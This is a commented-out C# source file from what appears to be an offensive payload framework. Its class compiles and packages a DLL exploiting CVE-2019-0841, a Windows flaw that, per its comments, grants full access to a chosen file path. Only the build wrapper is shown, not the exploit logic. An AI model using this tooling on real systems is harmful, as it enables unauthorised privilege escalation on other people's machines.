/*using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Diagnostics;

using MyWarez.Core;


namespace MyWarez.Payloads
{
    // Gives Full access to outfilepath
    // Some restrictions apply
   
    // Exports: int WriteDacl(wchar_t* outfilepath)
    public class CVE_2019_0841 : DynamicLinkLibrary
    {
        public CVE_2019_0841(Payload targetPathCppPayload) : base(Constants.DynamicFilePayloadDirectory + "DynamicLinkLibrary" + Path.DirectorySeparatorChar + typeof(CVE_2019_0841).Name)
        {
            if (!(targetPathCppPayload is IFilePayload))
                throw new ArgumentException();
            TargetPathCppPayload = targetPathCppPayload;
        }
        public CVE_2019_0841() : this(new LicenseTargetPath()) { }
        public override string Name { get; } = "CVE_2019_0841";
        public Payload TargetPathCppPayload { get; }
        private void CopyTargetPath()
        {
            string targetPathSource = ((IFilePayload)TargetPathCppPayload).Text;
            if (!targetPathSource.Contains("wchar_t* GetTargetDirectory()"))
                throw new ArgumentException("GetTargetDirectory not implemented!");
            if (!targetPathSource.Contains("wchar_t* GetTargetFilename()"))
                throw new ArgumentException("GetTargetFilename not implemented!");
            if (!targetPathSource.Contains("wchar_t* GetTargetPath()"))
                throw new ArgumentException("GetTargetPath not implemented!");
            if (!targetPathSource.Contains("wchar_t* GetTargetDirectoryWithoutSlash()"))
                throw new ArgumentException("GetTargetDirectoryWithoutSlash not implemented!");
            File.WriteAllText("TargetPath.cpp", targetPathSource);
        }
        public override byte[] Bytes
        {
            get
            {
                var myTempDir = Constants.TempDirectory + Utils.RandomString(5);
                Directory.CreateDirectory(myTempDir);
                Utils.CopyFilesRecursively(SourceDirectory, myTempDir);
                var cwd = Directory.GetCurrentDirectory();
                Directory.SetCurrentDirectory(myTempDir);
                CopyTargetPath();
                var proc2 = Process.Start("cmd.exe", "/c " + CompileScriptName);
                proc2.WaitForExit();
                var outputFileName = ExecutableName + ".dll";
                var outputBytes = System.IO.File.ReadAllBytes(outputFileName);
                Directory.SetCurrentDirectory(cwd);

                return outputBytes;
            }
        }
    }
}
*/